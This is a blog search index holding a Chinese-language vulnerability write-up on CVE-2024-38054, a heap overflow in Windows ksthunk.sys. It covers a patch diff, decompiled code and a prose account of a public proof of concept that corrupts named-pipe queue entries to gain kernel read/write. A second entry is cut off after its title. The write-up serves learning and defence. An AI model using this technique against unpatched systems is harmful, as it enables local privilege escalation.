<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2024-38054</title>
    <link href="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2024-38054"><a href="#CVE-2024-38054" class="headerlink" title="CVE-2024-38054"></a>CVE-2024-38054</h1><h2 id="一-简述"><a href="#一-简述" class="headerlink" title="一.简述"></a>一.简述</h2><ul><li>最近看到24年windows的Kernel Streaming框架出现了许多漏洞，想跟着分析一下最终选择了分析CVE-2024-38054，跟着大佬的文章看看是怎么触发漏洞的，了解一下ernel Streaming的攻击面。设置win11双虚拟机调试的时候，windbg com调试没连接上，使用的设置远程ip与key的连接方式。</li><li>CVE-2024-38054由 Angelboy提交给微软，在24年7月份修补的一个堆溢出漏洞。该漏洞在ksthunk.sys。驱动的作用是将<em>WOW64</em>（Windows 32-bit on Windows 64-bit）程序对使用Kernel Streaming框架的设备发起irp请求转化为64位的irp请求，以便后续处理无需区分wow64程序和正常64位程序。</li><li>CVE-2024-38054的POC已在GitHub公开</li><li><a href="https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054">https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054</a></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724153354120.png" class="" title="png"><h2 id="二-分析环境"><a href="#二-分析环境" class="headerlink" title="二.分析环境"></a>二.分析环境</h2><ul><li>Microsoft Visual Studio Community 2022</li><li>BinDiff 8</li><li>Windows 11 22h2 22621.819</li></ul><h2 id="三-Kernel-Streaming框架简介"><a href="#三-Kernel-Streaming框架简介" class="headerlink" title="三.Kernel Streaming框架简介"></a>三.Kernel Streaming框架简介</h2><ul><li>Kernel Streaming框架主要为windows中的音频、视频等设备提供支持。Kernel Streaming框架提供三种多媒体类驱动模型： port类, stream类和 AVStream类。音视频类的驱动大多是pnp类型的驱动，在windows中的设备不是类似\Devcie\NamedPipe的形式。而是类似下面形式：</li></ul><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">\\?\root#system#0000#&#123;cf1dda2c<span class="hljs-string">-9743</span><span class="hljs-string">-11</span>d0-a3ee<span class="hljs-string">-00</span>a0c9223196&#125;\&#123;cfd669f1<span class="hljs-string">-9</span>bc2<span class="hljs-string">-11</span>d0<span class="hljs-string">-8299</span><span class="hljs-string">-0000</span>f822fe8a&#125;&amp;&#123;cf1dda2c<span class="hljs-string">-9743</span><span class="hljs-string">-11</span>d0-a3ee<span class="hljs-string">-00</span>a0c9223196&#125;<br></code></pre></td></tr></table></figure><ul><li>如果想枚举pnp设备的路径的话，比较方便的方式是使用windows自带的工具：</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">pnputil /<span class="hljs-keyword">enum</span>-<span class="hljs-built_in">int</span>erfaces<br></code></pre></td></tr></table></figure><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724154046250.png" class="" title="png"><ul><li>可以使用WDK提供的工具KsStudio来查看使用Kernel Streaming框架的驱动，我目前在win10与win11 执行都不太正常。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724154645809.png" class="" title="png"><ul><li>在Kernel Streaming框架中有两个比较重要的内核对象种类：<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters">KS Filters</a> 和 <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins">KS Pins</a></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724154733975.png" class="" title="png"><ul><li>ks filters是由微型端口驱动提供的filter factory创建的，用户态程序可以发起irp请求基于filter实例创建ks pin，然后使用ks pin实现向filter提交nodes 或者读取经过filter的数据。</li></ul><h2 id="四-pnp设备注册逻辑"><a href="#四-pnp设备注册逻辑" class="headerlink" title="四.pnp设备注册逻辑"></a>四.pnp设备注册逻辑</h2><ul><li>以mskssrv.sys为例，可以在<code>C:\Windows\INF\ks.inf</code>中DeviceRegistration节中找到注册逻辑</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724155200503.png" class="" title="png"><ul><li>可以看到在DeviceRegistration节中对<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> 写入</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rundll32</span>.exe streamci,StreamingDeviceSetup &#123;<span class="hljs-number">96</span>E080C7-<span class="hljs-number">143</span>C-<span class="hljs-number">11</span>D1-B40F-<span class="hljs-number">00</span>A0C9223196&#125;,&#123;<span class="hljs-number">3</span>C0D501A-<span class="hljs-number">140</span>B-<span class="hljs-number">11</span>D1-B40F-<span class="hljs-number">00</span>A0C9223196&#125;,&#123;<span class="hljs-number">3</span>C0D501A-<span class="hljs-number">140</span>B-<span class="hljs-number">11</span>D1-B40F-<span class="hljs-number">00</span>A0C9223196&#125;<br></code></pre></td></tr></table></figure><ul><li>这个表示只会执行一次，执行streamci.dll的<code>StreamingDeviceSetup</code>函数，在reactos <code>dll\win32\streamci\streamci.c</code> 有相关函数的实现</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724155959344.png" class="" title="png"><ul><li>在StreamingDeviceSetup函数中首先分割参数，然后调用InstallSoftwareDeviceInterface函数注册设备</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#define STATIC_BUSID_SoftwareDeviceEnumerator \</span><br>    <span class="hljs-attribute">0x4747B320L</span>, <span class="hljs-number">0</span>x62CE, <span class="hljs-number">0</span>x11CF, &#123;<span class="hljs-number">0</span>xA5, <span class="hljs-number">0</span>xD6, <span class="hljs-number">0</span>x28, <span class="hljs-number">0</span>xDB, <span class="hljs-number">0</span>x04, <span class="hljs-number">0</span>xC1, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00&#125;<br></code></pre></td></tr></table></figure><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724160159633.png" class="" title="png"><ul><li>在InstallSoftwareDeviceInterface函数中，首先搜索STATIC_BUSID_SoftwareDeviceEnumerator的实例路径，然后进行DeviceIoControl code IOCTL_SWENUM_INSTALL_INTERFACE，参数包含DeviceID即{96E080C7-143C-11D1-B40F-00A0C9223196}、 InterfaceId即 {3C0D501A-140B-11D1-B40F-00A0C9223196} 与pnputil查询的结果一致，即可以通过inf的DeviceRegistration节来判断某个pnp实例路径是属于哪一个驱动的。</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pnputil</span> /enum-interfaces /class &#123;<span class="hljs-number">3</span>C0D501A-<span class="hljs-number">140</span>B-<span class="hljs-number">11</span>D1-B40F-<span class="hljs-number">00</span>A0C9223196&#125;<br></code></pre></td></tr></table></figure><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724160807171.png" class="" title="png"><h2 id="五-补丁对比"><a href="#五-补丁对比" class="headerlink" title="五.补丁对比"></a>五.补丁对比</h2><ul><li>下载2024的七月更新<ul><li><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB5040442">https://www.catalog.update.microsoft.com/Search.aspx?q=KB5040442</a></li></ul></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724162018749.png" class="" title="png"><ul><li><p>驱动中此漏洞相关改动三个函数:</p><ul><li><p>CKSThunkPin::GetExtendedHeaderSize</p></li><li><p>CKSThunkPin::LocateFormatHandler</p></li><li><p>CKSThunkPin::ThunkStreamingIrp</p></li></ul></li><li><p>CKSThunkPin::GetExtendedHeaderSize中的改动如下：</p></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724163316278.png" class="" title="png"><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724165516688.png" class="" title="png"><ul><li>首先判断flag是否含有KSSTREAM_HEADER_OPTIONSF_METADATA标识，如果含有则返回的size+0x10。KSSTREAM_HEADER_OPTIONSF_METADATA标识用于KSSTREAM_HEADER结构体的OptionsFlags成员，其含义是在KS_FRAME_INFO结构体后有一个KSSTREAM_METADATA_INFO 结构体。</li><li>KSSTREAM_HEADER_OPTIONSF_METADATA标识一般会配合KSSTREAM_HEADER_OPTIONSF_FRAMEINFO标识一起使用，该标识的含义是KSSTREAM_HEADER结构体后会有一个KS_FRAME_INFO 结构体。</li><li>KSSTREAM_HEADER结构体如下所示：</li></ul><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elm">typedef struct &#123;<br>  <span class="hljs-type">ULONG</span>    <span class="hljs-type">Size</span>;  <br>  <span class="hljs-type">ULONG</span>    <span class="hljs-type">TypeSpecificFlags</span>;<br>  <span class="hljs-type">KSTIME</span>   <span class="hljs-type">PresentationTime</span>;<br>  <span class="hljs-type">LONGLONG</span> <span class="hljs-type">Duration</span>;<br>  <span class="hljs-type">ULONG</span>    <span class="hljs-type">FrameExtent</span>;<br>  <span class="hljs-type">ULONG</span>    <span class="hljs-type">DataUsed</span>;<br>  <span class="hljs-type">PVOID</span>    <span class="hljs-type">Data</span>;<br>  <span class="hljs-type">ULONG</span>    <span class="hljs-type">OptionsFlags</span>;<br>  <span class="hljs-type">ULONG</span>    <span class="hljs-type">Reserved</span>;<br>&#125; <span class="hljs-type">KSSTREAM_HEADER</span>, *<span class="hljs-type">PKSSTREAM_HEADER</span>;<br></code></pre></td></tr></table></figure><ul><li><p>需要注意的是改结构体的size成员，由于KSSTREAM_HEADER可以扩展，所以该成员的值不能小于sizeof(KSSTREAM_HEADER)。例如当同时具有这两个标识时内存布局如下所示：</p><ul><li><p>KSSTREAM_HEADER结构体</p></li><li><p>KS_FRAME_INFO 结构体</p></li><li><p>KSSTREAM_METADATA_INFO 结构体</p></li></ul></li><li><p>此时KSSTREAM_HEADER结构体的Size成员的值应不小于sizeof(KSSTREAM_HEADER)+sizeof(KS_FRAME_INFO)+sizeof(KSSTREAM_METADATA_INFO )</p></li><li><p>通过查看CKSThunkPin::GetExtendedHeaderSize函数交叉引用</p></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724170035163.png" class="" title="png"><ul><li><p>可以看到CKSThunkPin::GetExtendedHeaderSize函数只在CKSThunkPin::ThunkStreamingIrp中调用</p></li><li><p>CKSThunkPin::ThunkStreamingIrp中的改动是：</p></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724171601322.png" class="" title="png"><ul><li><p>如果KSSTREAM_HEADER结构体OptionsFlags字段，如果包含KSSTREAM_HEADER_OPTIONSF_METADATA标识，KSSTREAM_HEADER结构体的size成员应不小于0x88即sizeof(KSSTREAM_HEADER)+sizeof(KS_FRAME_INFO)+sizeof(KSSTREAM_METADATA_INFO )的大小。</p></li><li><p>CKSThunkPin::LocateFormatHandler的改动如果interface为null也可以返回。</p></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724172453285.png" class="" title="png"><h2 id="六-漏洞逻辑触发"><a href="#六-漏洞逻辑触发" class="headerlink" title="六.漏洞逻辑触发"></a>六.漏洞逻辑触发</h2><ul><li>通过补丁对比可以看出漏洞大概率发生在CKSThunkPin::ThunkStreamingIrp函数中，通过交叉引用可以在看出CKSThunkPin::ThunkStreamingIrp函数只在CKSThunkPin::DispatchIoctl函数中调用，调用的条件是改irp请求是32位程序发起的且RequestorMode为1即用户态且IoControlCode是0x2F4017或者0x2F8013。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724230708079.png" class="" title="png"><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724230741132.png" class="" title="png"><ul><li><p>然后再往上交叉引用就索引不到了</p></li><li><p>在看ksthunk的driverEntry函数，是哪个函数处理deviceIocontrol的irp请求的。</p></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724230927012.png" class="" title="png"><ul><li>可以看出DriverEntry主要是调用了CKernelFilterDriver::Initialize()函数进行初始化。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724231106461.png" class="" title="png"><ul><li>DriverObject的type的偏移是0，加上v3（0x70）即是majorfunction 的偏移，这个do while循环实际上是将所有的major function设置为CKernelFilterDevice::DispatchIrpBridge函数</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724231259903.png" class="" title="png"><ul><li>CKernelFilterDevice::DispatchIrpBridge函数是CKernelFilterDevice::DispatchIrp函数的包装。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724231348808.png" class="" title="png"><ul><li>这里DeviceExtension成员应该是CKernelFilterDevice的子类，对于不同的majorfunction请求调用不同的子类虚函数进行处理。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724231514637.png" class="" title="png"><ul><li>通过调试poc可以得到完整的堆栈。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250725010810077.png" class="" title="png"><ul><li>可以看出在CKernelFilterDevice::DispatchIrp函数中调用CKernelFilterDevice的子类CKSThunkDevice的CKSThunkDevice::DispatchIoctl成员函数处理，然后在CKSThunkDevice的CKSThunkDevice::DispatchIoctl函数中CKSThunkPin::DispatchIoctl函数处理。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250724233300951.png" class="" title="png"><h2 id="七-CKSThunkPin-ThunkStreamingIrp函数分析"><a href="#七-CKSThunkPin-ThunkStreamingIrp函数分析" class="headerlink" title="七.CKSThunkPin::ThunkStreamingIrp函数分析"></a>七.CKSThunkPin::ThunkStreamingIrp函数分析</h2><ul><li>我这里看了自己ida的反汇编效果，不如大佬已经放出来的分析函数，并且函数内的逻辑差距不大这里就直接copy了</li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall CKSThunkPin::ThunkStreamingIrp(__int64 a1, PIRP a2, __int64 a3,<span class="hljs-built_in"> int </span>*a4)<br>&#123;<br><span class="hljs-keyword">  .</span>...<br>  v55 = a2-&gt;Tail.Overlay.CurrentStack<span class="hljs-class">Location;</span><br>  OutputBuffer<span class="hljs-class">Length = v55-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br> <span class="hljs-built_in"> if </span>( (unsigned int)OutputBufferLength &lt; 0x30 ) // OutputBufferLength不能小于0x30即sizeof(KSSTREAM_HEADER结构体)大小<br>  &#123;<br><span class="hljs-keyword">    .</span>... // 返回错误码<br>   &#125;<br><span class="hljs-keyword">   .</span>...<br>  PoolWithTag = (LONGLONG *)ExAllocatePoolWithTag((POO<span class="hljs-class">L_TYPE)512, OutputBufferLength, 0x6874734Bu);</span><br><span class="hljs-keyword">  .</span>...<br>  v9 = a2-&gt;UserBuffer;<br> <span class="hljs-built_in"> if </span>( v55-&gt;Parameters.DeviceIoControl.IoControlCode == 0x2F8013 ) // 根据IoControlCode 使用ProbeForRead或者ProbeForWrite校验UserBuffer地址<br><span class="hljs-keyword">  .</span>...<br>  memmove(PoolWithTag, a2-&gt;UserBuffer, OutputBuffer<span class="hljs-class">Length);</span> // 根据OutputBufferLength拷贝到内核态的内存中 防止double fetch<br>  a2-&gt;AssociatedIrp.MasterIrp = (struct _IRP *)PoolWithTag;<br><span class="hljs-keyword">   .</span>..<br>  v12 = (KSSTREAM_HEADER_32 *)PoolWithTag;  // UserBuffer是一个KSSTREAM_HEADER_32数组<br><span class="hljs-keyword">  .</span>..<br> <span class="hljs-built_in"> if </span>( *a4 &gt;= 0 )<br>  &#123;<br>    while ( (_DWORD)OutputBufferLength &amp;&amp; (unsigned int)OutputBufferLength &gt;= v12-&gt;Size )<br>    &#123;<br>      v53 = v11 + 1;<br>      v16 = v12-&gt;Data;<br>     <span class="hljs-built_in"> if </span>( v16 )<br>      &#123;<br>        ProbeForWrite((volatile void *)v16, v12-&gt;FrameExtent, 1u); // 校验KSSTREAM_HEADER_32的FrameExtent成员的地址是否合法<br>       <span class="hljs-built_in"> if </span>( v12-&gt;DataUsed &gt; v12-&gt;FrameExtent )<br>          ExRaiseStatus(0xC0000206);<br>        v17 = v12-&gt;OptionsFlags;<br>       <span class="hljs-built_in"> if </span>( !v15 )<br>        &#123;<br>          v17 &amp;= 0xFFFE7FFF;<br>          v12-&gt;OptionsFlags = v17;<br>        &#125;<br>       <span class="hljs-built_in"> if </span>( (v17 &amp; 0x18000) == 0<br>          &amp;&amp; !IoAllocateMdl((PVOID)(unsigned int)v12-&gt;Data, v12-&gt;FrameExtent, Irp-&gt;MdlAddress != 0i64, 1u, Irp) )<br>        &#123;<br>          ExRaiseStatus(-1073741670);<br>        &#125;<br>        MetadataBuffer32 = GetMetadataBuffer32((struct _KSSTREAM_HEADER32 *)v12); <br><span class="hljs-keyword">        .</span>.. //校验MetadataBuffer32的地址<br>      &#125;<br>      ExtendedHeaderSize = 0;<br>      v21 = v12-&gt;Size;<br>     <span class="hljs-built_in"> if </span>( (unsigned int)v21 &gt; 0x30 ) 如果有扩展头，则获得扩展头的size，扩展头的size为KSSTREAM_HEADER_32成员size的值-0x30<br>      &#123;<br>...<br>        ExtendedHeaderSize = CKSThunkPin::GetExtendedHeaderSize(<br>                               (CKSThunkPin *)a1,<br>                               v12-&gt;OptionsFlags,<br>                               (unsigned int)(v21 - 0x30));<br>        LODWORD(v21) = v12-&gt;Size;<br>        LODWORD(v13) = v52;<br>      &#125;<br>      LODWORD(v13) = ExtendedHeaderSize + 0x38 + v13; // 64位buffer的size为ExtendedHeaderSize+0x38 即KSSTREAM_HEADER_32成员size+8<br>      v52 = v13;<br>      LODWORD(OutputBuffer<span class="hljs-class">Length) = OutputBufferLength - v21;</span><br>      v12 = (KSSTREAM_HEADER_32 *)((char *)v12 + (unsigned int)v21);<br>      v14 = a1;<br>      v15 = v60;<br>      v11 = v53;<br>    &#125;<br>   ......<br>  &#125;<br><span class="hljs-keyword">  .</span>...<br>  v26 = (char *)ExAllocatePoolWithTag((POO<span class="hljs-class">L_TYPE)512, v13 + 0x10, 0x6874734Bu);</span> // 根据while循环算出的size分配v13 +0x10的64位buffer<br><span class="hljs-keyword">  .</span>..<br>  v32 = (struct KSSTREAM_HEADER *)(v26 + 0x10);  // 新分配的buffer+0x10 作为起始<br><span class="hljs-keyword">  .</span>..<br>  v34 = v53;<br> <span class="hljs-built_in"> if </span>( !v53 )<br>   <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_77;</span><br>  while ( 1 ) //对64位buffer进行赋值<br>  &#123;<br><span class="hljs-keyword">    .</span>....<br>    v36 = *((_DWORD *)PoolWithTag + 11);<br>    v32-&gt;OptionsFlags = v36;<br>    v37 = v36 &amp; 0x8000;<br>....<br>   <span class="hljs-built_in"> if </span>( !v37 )<br>      break;<br>....<br>LABEL_64:<br>   <span class="hljs-built_in"> if </span>( GetMetadataBuffer32((struct _KSSTREAM_HEADER32 *)PoolWithTag) )  // 如果metaBuffer32即拥有KSSTREAM_HEADER_OPTIONSF_METADATA的标识<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( MdlAddress &amp;&amp; (MdlAddress = MdlAddress-&gt;Next) != 0i64 || (v32-&gt;OptionsFlags &amp; 0x8000) != 0 )<br>      &#123;<br>        v40 = GetMetadataBuffer64(v32); // 获得metaBuffer64的地址即v32+0x80的位置<br>        v42 = v40;<br>       <span class="hljs-built_in"> if </span>( v40 )<br>        &#123;<br>          v40-&gt;BufferSize = *v41;<br>          v40-&gt;Flags = v41[4];<br>          v40-&gt;Reserved = v41[5]; // 即v32+1c的位置 当KSSTREAM_HEADER_32成员size+8&lt;0xa0时发生溢出<br>          v40-&gt;UsedSize = v41[1];<br>          v40-&gt;SystemVa = 0i64;<br><span class="hljs-keyword">          .</span>...<br>         &#125;<br>      &#125;<br>    &#125;<br><span class="hljs-keyword">    .</span>..<br>  &#125;<br><span class="hljs-keyword">  .</span>...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>可以看出这两个while循环主要是做一个32位结构体到64位结构体的转换：</p><ul><li><p>KSSTREAM_HEADER在32位大小为0x30，在64位为0x38。</p></li><li><p>KSSTREAM_METADATA_INFO 结构体在32位大小是0x18，而64位为0x20。</p></li><li><p>KSSTREAM_METADATA_INFO结构体相对于KSSTREAM_HEADER 在32位的偏移是0x70 在64位的偏移为0x80。</p></li></ul></li><li><p>当内存结构为下面的情况的时候：</p><ul><li><p>KSSTREAM_HEADER</p></li><li><p>KS_FRAME_INFO</p></li><li><p>KSSTREAM_METADATA_INFO</p></li></ul></li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250726163708237.png" class="" title="png"><ul><li><p>在32位的总体大小为0x88，在64位的总体大小为0xa0</p></li><li><p>而在算64位的size的算法是32位size-0x30+0x38 以size为0x88为例，最终的size为0x90，所以申请了0x90的内存空间，而实际要拷贝的内存大小是0xa0， 导致10字节的溢出。</p></li></ul><h2 id="八-POC分析"><a href="#八-POC分析" class="headerlink" title="八.POC分析"></a>八.POC分析</h2><ul><li>该PoC获得mstee.sys实现ks Filters实例路径后，调用KsCreatePin函数获得ks pin的实例</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250725100053364.png" class="" title="png"><ul><li>之后调用DeviceIoControl触发漏洞。</li></ul><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250725101532741.png" class="" title="png"><ul><li>漏洞溢出1字节修改namepipe的DATA_QUEUE_ENTRY的NextEntry的flink成员的低位使其指向nextEntry的data字段 从而控制链表指向用户态，从而控制整个数据结构实现任意地址读写，DATA_QUEUE_ENTRY结构体如下：</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct DATA_QUEUE_ENTRY &#123;<br>    LIST_ENTRY NextEntry<span class="hljs-comment">;</span><br>    _IRP* Irp<span class="hljs-comment">;</span><br>    _SECURITY_CLIENT_CONTEXT* SecurityContext<span class="hljs-comment">;</span><br>    uint32_t EntryType<span class="hljs-comment">;</span><br>    uint32_t QuotaInEntry<span class="hljs-comment">;</span><br>    uint32_t DataSize<span class="hljs-comment">;</span><br>    uint32_t x<span class="hljs-comment">;</span><br>    char Data[]<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/07/27/CVE_2024_38054%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250726164942195.png" class="" title="png"><h2 id="九-总结"><a href="#九-总结" class="headerlink" title="九.总结"></a>九.总结</h2><ul><li>跟着网上分享的文档，分析出漏洞成因以及补丁分析确定了漏洞函数，并且分析了该漏洞的原理，阐述了漏洞exp的讲解。该漏洞的漏洞点是比较隐蔽的，不像传统的堆溢出有明显的内存拷贝操作，有学到新的思路。</li></ul><h2 id="十-参考链接"><a href="#十-参考链接" class="headerlink" title="十.参考链接"></a>十.参考链接</h2><ul><li><a href="https://research.qianxin.com/archives/2866">https://research.qianxin.com/archives/2866</a></li><li><a href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/">https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/</a></li><li><a href="https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/">https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/</a></li><li><a href="https://ssd-disclosure.com/ssd-advisory-ksthunk-sys-integer-overflow-pe/">https://ssd-disclosure.com/ssd-advisory-ksthunk-sys-integer-overflow-pe/</a></li><li><a href="https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054">https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>window_security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability_analysis</tag>
      
      <tag>Windows_cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-21768 漏洞分析</title>
    <link href="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
